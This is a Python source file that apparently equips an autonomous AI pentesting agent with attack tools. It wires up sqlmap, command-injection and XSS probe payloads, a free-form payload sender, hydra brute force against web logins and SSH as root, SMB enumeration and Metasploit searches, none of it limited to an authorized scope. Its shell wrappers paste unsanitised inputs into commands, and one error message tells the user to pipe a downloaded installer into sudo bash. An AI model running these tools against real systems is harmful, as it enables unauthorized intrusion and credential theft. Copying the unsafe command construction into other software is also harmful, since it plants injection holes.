"""Attack tools — exploitation, injection testing, payload delivery.

Reference: AWE xss_agent, sqli_agent — exploitation patterns
           VulnBot roles/scanner.py, roles/exploiter.py — tool list
"""

from __future__ import annotations

import asyncio
import re
import time
from pathlib import Path
from typing import Any, Dict

from darwin.tools.mcp_gateway import MCPGateway, ToolResult


def _parse_hydra_output(stdout: str) -> Dict[str, Any]:
    """Parse hydra output for discovered credentials."""
    credentials = []
    for line in stdout.split("\n"):
        match = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", line)
        if match:
            credentials.append({"username": match.group(1), "password": match.group(2)})
        # Alternative format: host: ... login: ... password: ...
        match2 = re.search(r"\[(\d+)\]\[(\w+)\]\s+host:\s*\S+\s+login:\s*(\S+)\s+password:\s*(\S+)", line)
        if match2:
            credentials.append({"service": match2.group(2), "username": match2.group(3), "password": match2.group(4)})
    return {"credentials": credentials, "count": len(credentials)}


def _parse_searchsploit_output(stdout: str) -> Dict[str, Any]:
    """Parse searchsploit results for exploits."""
    exploits = []
    for line in stdout.split("\n"):
        # Format: Title | Path
        parts = line.split(" | ")
        if len(parts) >= 2:
            exploits.append({
                "title": parts[0].strip(),
                "path": parts[1].strip(),
            })
    return {"exploits": exploits, "count": len(exploits)}


def _parse_smbmap_output(stdout: str) -> Dict[str, Any]:
    """Parse smbmap output for SMB shares and permissions."""
    shares = []
    for line in stdout.split("\n"):
        line = line.strip()
        if not line or "IP：" in line or "SMBMap" in line:
            continue
        match = re.match(r"\s*(\S+)\s+(\S+)\s+(\S+)", line)
        if match:
            shares.append({
                "share": match.group(1),
                "permissions": match.group(2),
                "comment": match.group(3) if match.group(3) != "NO" else "",
            })
    return {"shares": shares, "count": len(shares)}


async def _run_shell(cmd: str, timeout: int = 60) -> ToolResult:
    """Execute a shell command with timeout."""
    import asyncio
    start = time.perf_counter()
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        elapsed = (time.perf_counter() - start) * 1000
        return ToolResult(
            tool_name="shell_exec",
            success=proc.returncode == 0,
            stdout=stdout.decode("utf-8", errors="replace"),
            stderr=stderr.decode("utf-8", errors="replace"),
            exit_code=proc.returncode or 0,
            elapsed_ms=elapsed,
        )
    except asyncio.TimeoutError:
        elapsed = (time.perf_counter() - start) * 1000
        return ToolResult(
            tool_name="shell_exec",
            success=False,
            stdout="",
            stderr=f"Timeout after {timeout}s",
            exit_code=-1,
            elapsed_ms=elapsed,
        )


async def _python_request(
    method: str, url: str, data: str = "", headers: str = "",
    timeout: int = 10,
) -> ToolResult:
    """Execute a HTTP request via Python (for complex payloads).

    Uses a temp file to avoid shell escaping issues with special characters
    in URLs and payloads (e.g. single quotes in SQLi).
    """
    import asyncio
    import json
    import tempfile
    import os as _os

    script = f"""
import urllib.request, json
url = {json.dumps(url)}
method = {json.dumps(method)}
data = {json.dumps(data)}
headers = {json.dumps(headers)}

req = urllib.request.Request(url, method=method, data=data.encode() if data else None)
if data and method in ('POST', 'PUT', 'PATCH'):
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
if headers:
    for h in headers.strip().split('\\\\n'):
        if ':' in h:
            k, v = h.split(':', 1)
            req.add_header(k.strip(), v.strip())

try:
    with urllib.request.urlopen(req, timeout={timeout}) as resp:
        body = resp.read().decode('utf-8', errors='replace')
        print(f"STATUS:{{resp.status}}")
        for k, v in resp.getheaders():
            print(f"HEADER:{{k}}:{{v}}")
        print("BODY_START")
        print(body[:10000])
except Exception as e:
    print(f"ERROR:{{e}}")
"""
    # Write to temp file to avoid shell escaping issues
    fd, tmpath = tempfile.mkstemp(suffix=".py", prefix="darwin_req_")
    try:
        _os.write(fd, script.encode("utf-8"))
        _os.close(fd)
        cmd = f"python3 {tmpath}"
        result = await _run_shell(cmd, timeout=timeout + 5)
    finally:
        try:
            _os.unlink(tmpath)
        except OSError:
            pass
    return result


def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
    """Register all attack/exploitation tools.

    Reference: AWE exploitation agents + VulnBot scanner/exploiter tools
    """

    # ── SQL injection test ──────────────────────────────────────
    async def sqlmap_test(url: str, param: str, technique: str = "BEUSTQ",
                         method: str = "GET", body_format: str = "form",
                         content_type: str = "") -> ToolResult:
        """Run sqlmap against a target parameter.

        Args:
            url: Target URL
            param: Parameter name to test
            technique: SQLi techniques (BEUSTQ)
            method: HTTP method (GET/POST)
            body_format: For POST: "form" (urlencoded) or "json" (JSON body)
            content_type: Custom Content-Type header (overrides body_format)
        """
        # Level 2, risk 1 for speed
        base_cmd = (f"sqlmap -u '{url}' --technique={technique} --batch "
                     f"--level=2 --risk=1 --flush-session --smart "
                     f"--threads=4 --output-dir=/tmp/sqlmap")
        if method.upper() == "POST":
            if body_format == "json":
                # JSON body: {"param":"*"} — sqlmap's injection marker
                ct = content_type or "application/json"
                data_str = f'{{"{param}":"*"}}'
                cmd = f"{base_cmd} --data='{data_str}' --headers='Content-Type: {ct}' 2>&1"
            else:
                # Form-urlencoded (default)
                ct = content_type or "application/x-www-form-urlencoded"
                if ct != "application/x-www-form-urlencoded":
                    cmd = f"{base_cmd} --data='{param}=*' --headers='Content-Type: {ct}' 2>&1"
                else:
                    cmd = f"{base_cmd} --data='{param}=*' 2>&1"
        else:
            cmd = f"{base_cmd} -p {param} 2>&1"
        return await _run_shell(cmd, timeout=25)

    gateway.register(
        name="sqlmap_test",
        func=sqlmap_test,
        description="Test for SQL injection vulnerability using sqlmap. For JSON APIs, set body_format='json'.",
        parameters={
            "url": {"type": "string", "description": "Target URL with parameters"},
            "param": {"type": "string", "description": "Parameter to test for injection"},
            "technique": {"type": "string", "description": "SQLi techniques: B(E)oolean, E(rror), U(nion), S(tacked), T(ime), Q(uery)"},
            "method": {"type": "string", "description": "HTTP method (GET/POST)"},
            "body_format": {"type": "string", "description": "For POST: 'form' (urlencoded) or 'json' (JSON body)"},
            "content_type": {"type": "string", "description": "Custom Content-Type header value"},
        },
    )

    # ── Web fuzzing (ffuf) ──────────────────────────────────────
    gateway.register_shell_tool(
        name="ffuf_fuzz",
        command_template="ffuf -u '{url}' -w /usr/share/dirb/wordlists/common.txt -mc 200,301,302,403 -o /dev/null 2>&1 | head -100",
        description="Fuzz web parameters or paths using ffuf",
        parameters={
            "url": {"type": "string", "description": "Target URL with FUZZ keyword"},
        },
    )

    # ── HTTP request with custom payload ────────────────────────
    async def send_payload(
        url: str, param: str, payload: str, method: str = "GET",
        encode_type: str = "none",
    ) -> ToolResult:
        """Send a custom payload to a target, with optional encoding."""
        import urllib.parse

        # Apply encoding
        encoded_payload = payload
        if encode_type == "url":
            encoded_payload = urllib.parse.quote(payload)
        elif encode_type == "double_url":
            encoded_payload = urllib.parse.quote(urllib.parse.quote(payload))
        elif encode_type == "html_entity":
            encoded_payload = "".join(f"&#{ord(c)};" for c in payload)

        if method.upper() == "GET":
            separator = "&" if "?" in url else "?"
            full_url = f"{url}{separator}{param}={encoded_payload}"
            return await _python_request("GET", full_url)
        else:
            return await _python_request("POST", url, f"{param}={encoded_payload}")

    gateway.register(
        name="send_payload",
        func=send_payload,
        description="Send an exploitation payload to a target endpoint with configurable encoding",
        parameters={
            "url": {"type": "string", "description": "Target URL"},
            "param": {"type": "string", "description": "Parameter name to inject"},
            "payload": {"type": "string", "description": "Payload string to send"},
            "method": {"type": "string", "description": "HTTP method (GET/POST)"},
            "encode_type": {"type": "string", "description": "Encoding: none|url|double_url|html_entity"},
        },
    )

    # ── Command injection test ──────────────────────────────────
    async def command_injection_test(url: str, param: str) -> ToolResult:
        """Test for command injection vulnerability."""
        probes = [
            (";id", "semicolon"),
            ("|id", "pipe"),
            ("`id`", "backtick"),
            ("$(id)", "dollar_subshell"),
            ("\nid", "newline"),
        ]
        results = []
        for probe_cmd, probe_type in probes:
            separator = "&" if "?" in url else "?"
            probe_url = f"{url}{separator}{param}={probe_cmd}"
            import urllib.request
            try:
                req = urllib.request.Request(probe_url)
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read().decode("utf-8", errors="replace")
                    if "uid=" in body or "gid=" in body:
                        results.append(f"{probe_type}: EXECUTED (uid/gid found in response)")
                    else:
                        results.append(f"{probe_type}: no evidence of execution")
            except Exception as e:
                results.append(f"{probe_type}: error - {e}")

        return ToolResult(
            tool_name="command_injection_test",
            success=True,
            stdout="\n".join(results),
            stderr="",
            exit_code=0,
            elapsed_ms=0,
        )

    gateway.register(
        name="command_injection_test",
        func=command_injection_test,
        description="Test for command injection using multiple probe techniques",
        parameters={
            "url": {"type": "string", "description": "Target URL"},
            "param": {"type": "string", "description": "Parameter to test"},
        },
    )

    # ── XSS reflection test ─────────────────────────────────────
    async def xss_reflection_test(url: str, param: str) -> ToolResult:
        """Test for XSS by checking payload reflection."""
        probes = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]
        results = []
        for probe in probes:
            import urllib.request, urllib.parse
            separator = "&" if "?" in url else "?"
            probe_url = f"{url}{separator}{param}={urllib.parse.quote(probe)}"
            try:
                req = urllib.request.Request(probe_url)
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read().decode("utf-8", errors="replace")
                    if probe in body:
                        results.append(f"REFLECTED: {probe[:40]}... (intact)")
                    elif urllib.parse.unquote(probe) in body:
                        results.append(f"REFLECTED: {probe[:40]}... (decoded)")
                    else:
                        # Check for partial reflection
                        for char in ["<script>", "alert", "onerror"]:
                            if char in body:
                                results.append(f"PARTIAL: {probe[:40]}... ({char} found)")
                                break
                        else:
                            results.append(f"BLOCKED: {probe[:40]}... (not found)")
            except Exception as e:
                results.append(f"ERROR: {probe[:40]}... - {e}")

        return ToolResult(
            tool_name="xss_reflection_test",
            success=True,
            stdout="\n".join(results),
            stderr="",
            exit_code=0,
            elapsed_ms=0,
        )

    gateway.register(
        name="xss_reflection_test",
        func=xss_reflection_test,
        description="Test for XSS by sending payloads and checking reflection in response",
        parameters={
            "url": {"type": "string", "description": "Target URL"},
            "param": {"type": "string", "description": "Parameter to test for XSS"},
        },
    )

    # ── Hydra: Brute force ───────────────────────────────────────
    async def hydra_http_brute(
        url: str, userlist: str = "/usr/share/dirb/wordlists/common.txt",
        passlist: str = "/usr/share/dirb/wordlists/common.txt",
    ) -> ToolResult:
        """Brute force HTTP POST login form."""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        cmd = (
            f"hydra -l admin -P {passlist} "
            f"{parsed.hostname} "
            f"http-post-form '{parsed.path or '/'}:"
            f"user=^USER^&pass=^PASS^:"
            f"F=incorrect|F=invalid|F=failed' "
            f"-t 4 -f 2>&1 | head -50"
        )
        return await _run_shell(cmd, timeout=120)

    gateway.register(
        name="hydra_http_brute",
        func=hydra_http_brute,
        description="Brute force HTTP login form with common password using hydra",
        parameters={
            "url": {"type": "string", "description": "Target login URL"},
            "userlist": {"type": "string", "description": "Path to username wordlist"},
            "passlist": {"type": "string", "description": "Path to password wordlist"},
        },
    )

    gateway.register_shell_tool(
        name="hydra_ssh_brute",
        command_template="hydra -l root -P /usr/share/dirb/wordlists/common.txt ssh://{target} -t 4 -f 2>&1 | head -50",
        description="Brute force SSH login with common passwords using hydra",
        parameters={
            "target": {"type": "string", "description": "Target hostname or IP"},
        },
        parser=_parse_hydra_output,
        timeout=120,
    )

    # ── SearchSploit: Exploit-DB search ───────────────────────────
    gateway.register_shell_tool(
        name="searchsploit_search",
        command_template="searchsploit {query} 2>&1 | head -30",
        description="Search Exploit-DB for public exploits matching query (CVE, software name, etc.)",
        parameters={
            "query": {"type": "string", "description": "Search term: CVE ID, software name, or vulnerability type"},
        },
        parser=_parse_searchsploit_output,
        timeout=30,
    )

    # ── SMBMap: SMB enumeration ──────────────────────────────────
    gateway.register_shell_tool(
        name="smbmap_enum",
        command_template="smbmap -H {target} 2>&1",
        description="Enumerate SMB shares and their permissions on a target host",
        parameters={
            "target": {"type": "string", "description": "Target IP or hostname"},
        },
        parser=_parse_smbmap_output,
        timeout=60,
    )

    # ── Knowledge search (DarwinRAG + keyword fallback) ──────────
    async def knowledge_search(query: str, category: str = "") -> ToolResult:
        """Search penetration testing knowledge base for exploit patterns using
        TF-IDF semantic search with keyword-based fallback."""
        try:
            from darwin.rag import get_rag
            rag = get_rag()
            results = rag.search(query, top_k=5, category=category)

            # Fallback: keyword-based search via KnowledgeBase
            if not results:
                try:
                    from darwin.knowledge_base import KnowledgeBase
                    kb = KnowledgeBase()
                    kb_entries = kb.search(query, category=category or "", top_k=5)
                    if kb_entries:
                        output = "## Knowledge Base (keyword match)\n\n"
                        for i, e in enumerate(kb_entries, 1):
                            output += f"### {i}. {e.title} ({e.category}/{e.subcategory})"
                            if e.mitre_attack:
                                output += f" MITRE:{e.mitre_attack}"
                            output += f"\n{e.description}\n"
                            if e.techniques:
                                output += "**Techniques:**\n"
                                for t in e.techniques[:5]:
                                    output += f"  - {t}\n"
                            output += "\n"
                        return ToolResult(tool_name="knowledge_search", success=True,
                            stdout=output, stderr="", exit_code=0, elapsed_ms=0)
                except ImportError:
                    pass
                return ToolResult(tool_name="knowledge_search", success=True,
                    stdout="No matching knowledge patterns found.", stderr="", exit_code=0, elapsed_ms=0)

            output = "## Knowledge Base\n\n"
            for i, r in enumerate(results, 1):
                output += f"### {i}. {r['title']} (score:{r['score']:.3f}, {r.get('collection','')}/{r['category']})\n"
                output += f"{r['description']}\n"
                if r.get('techniques'):
                    output += "**Techniques:**\n"
                    for t in r.get('techniques', [])[:5]:
                        output += f"  - {t}\n"
                output += "\n"
            return ToolResult(tool_name="knowledge_search", success=True,
                stdout=output, stderr="", exit_code=0, elapsed_ms=0)
        except Exception as e:
            return ToolResult(tool_name="knowledge_search", success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=0)

    gateway.register(
        name="knowledge_search",
        func=knowledge_search,
        description="Search penetration testing knowledge base for exploit patterns, techniques, and bypass strategies",
        parameters={
            "query": {"type": "string", "description": "Natural language query (e.g. 'IDOR in FastAPI')"},
            "category": {"type": "string", "description": "Optional filter: IDOR, SQLI, AUTH, RECON"},
        },
    )

    # ── CVE Lookup: NIST NVD API ──────────────────────────────────
    async def cve_lookup(cve_id: str) -> ToolResult:
        """Look up CVE details from the NIST NVD API (free, no key required)."""
        import urllib.request as _ur, json as _json
        try:
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
            req = _ur.Request(url, headers={"User-Agent": "DARWIN/0.1"})
            with _ur.urlopen(req, timeout=15) as resp:
                data = _json.loads(resp.read())
            vulns = data.get("vulnerabilities", [])
            if not vulns:
                return ToolResult(tool_name="cve_lookup", success=True,
                    stdout=f"No CVE data found for {cve_id}", stderr="", exit_code=0, elapsed_ms=0)
            cve = vulns[0].get("cve", {})
            desc = cve.get("descriptions", [{}])[0].get("value", "")[:500]
            metrics = cve.get("metrics", {})
            cvss_v31 = metrics.get("cvssMetricV31", [{}])[0].get("cvssData", {})
            cvss_score = cvss_v31.get("baseScore", "N/A")
            cvss_severity = cvss_v31.get("baseSeverity", "N/A")
            vector = cvss_v31.get("vectorString", "")
            published = cve.get("published", "")
            modified = cve.get("lastModified", "")
            refs = [r.get("url", "") for r in cve.get("references", [])[:5]]
            output = (
                f"CVE: {cve_id}\n"
                f"CVSS v3.1: {cvss_score} ({cvss_severity})\n"
                f"Vector: {vector}\n"
                f"Published: {published}\n"
                f"Modified: {modified}\n"
                f"Description: {desc}\n"
                f"References:\n" + "\n".join(f"  - {r}" for r in refs)
            )
            return ToolResult(tool_name="cve_lookup", success=True, stdout=output,
                stderr="", exit_code=0, elapsed_ms=0,
                parsed_output={"cve_id": cve_id, "cvss_score": cvss_score,
                    "severity": cvss_severity, "description": desc[:200], "references": refs})
        except Exception as e:
            return ToolResult(tool_name="cve_lookup", success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=0)

    gateway.register(
        name="cve_lookup",
        func=cve_lookup,
        description="Look up CVE details from NIST NVD: CVSS score, severity, description, affected versions, and references. Use to assess vulnerability severity and find patches.",
        parameters={
            "cve_id": {"type": "string", "description": "CVE ID (e.g. CVE-2021-44228, CVE-2023-12345)"},
        },
    )

    # ── Metasploit exploit search ──────────────────────────────────
    async def metasploit_search(query: str) -> ToolResult:
        """Search Metasploit Framework for available exploit modules."""
        import asyncio
        try:
            cmd = f"msfconsole -q -x 'search {query}; exit' 2>&1"
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
            output = stdout.decode("utf-8", errors="replace")
            err_output = stderr.decode("utf-8", errors="replace")
            # Check if msfconsole is not installed (shell returns "not found")
            if "not found" in output.lower() or "not found" in err_output.lower():
                return ToolResult(tool_name="metasploit_search", success=False,
                    stdout="msfconsole not installed. Install: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo bash msfinstall",
                    stderr="msfconsole not found on PATH", exit_code=127, elapsed_ms=0)
            if "Matching Modules" in output or "exploit/" in output:
                return ToolResult(tool_name="metasploit_search", success=True,
                    stdout=output[:5000], stderr=err_output,
                    exit_code=proc.returncode or 0, elapsed_ms=0)
            return ToolResult(tool_name="metasploit_search", success=False,
                stdout=output[:2000] or "No matching modules found",
                stderr=err_output, exit_code=proc.returncode or 0, elapsed_ms=0)
        except asyncio.TimeoutError:
            return ToolResult(tool_name="metasploit_search", success=False,
                stdout="msfconsole search timed out", stderr="", exit_code=1, elapsed_ms=0)
        except Exception as e:
            return ToolResult(tool_name="metasploit_search", success=False,
                stdout=f"msfconsole search failed: {e}", stderr=str(e), exit_code=1, elapsed_ms=0)

    gateway.register(
        name="metasploit_search",
        func=metasploit_search,
        description="Search Metasploit Framework for available exploit modules, auxiliary scanners, and post-exploitation modules matching the query. Returns module name, rank, and description. Requires msfconsole installed.",
        parameters={
            "query": {"type": "string", "description": "Search term: software name, CVE ID, or vulnerability type (e.g. 'apache struts', 'CVE-2021-44228', 'samba')"},
        },
    )

    # ── go-exploitdb local search ──────────────────────────────────
    async def go_exploitdb_search(query: str, limit: int = 10) -> ToolResult:
        """Search the local go-exploitdb database for exploits matching a CVE or keyword."""
        import sqlite3
        db_path = Path(__file__).parent.parent.parent / "go-exploitdb.sqlite3"
        if not db_path.exists():
            return ToolResult(tool_name="go_exploitdb_search", success=False,
                stdout="go-exploitdb database not found. Run: go-exploitdb fetch",
                stderr="", exit_code=1, elapsed_ms=0)
        try:
            conn = sqlite3.connect(str(db_path))
            cursor = conn.cursor()
            cursor.execute(
                "SELECT cve_id, description, url, exploit_type FROM exploits "
                "WHERE cve_id LIKE ? OR description LIKE ? LIMIT ?",
                (f"%{query}%", f"%{query}%", limit),
            )
            rows = cursor.fetchall()
            conn.close()
            if not rows:
                return ToolResult(tool_name="go_exploitdb_search", success=True,
                    stdout="No matching exploits found in local database.",
                    stderr="", exit_code=0, elapsed_ms=0)
            results = [f"CVE: {r[0]}\nDescription: {r[1]}\nURL: {r[2]}\nType: {r[3]}" for r in rows]
            return ToolResult(tool_name="go_exploitdb_search", success=True,
                stdout="\n---\n".join(results), stderr="",
                exit_code=0, elapsed_ms=0)
        except Exception as e:
            return ToolResult(tool_name="go_exploitdb_search", success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=0)

    gateway.register(
        name="go_exploitdb_search",
        func=go_exploitdb_search,
        description="Search local go-exploitdb for public exploits matching a CVE ID or keyword. Returns exploit type, description, and references. Requires go-exploitdb database (fetch with: go-exploitdb fetch).",
        parameters={
            "query": {"type": "string", "description": "CVE ID or keyword to search for (e.g. 'CVE-2021-44228', 'Apache')"},
            "limit": {"type": "integer", "description": "Max results (default 10)"},
        },
    )

    return gateway


def create_attack_gateway() -> MCPGateway:
    """Factory: create a gateway with all attack tools registered."""
    gateway = MCPGateway()
    return register_attack_tools(gateway)
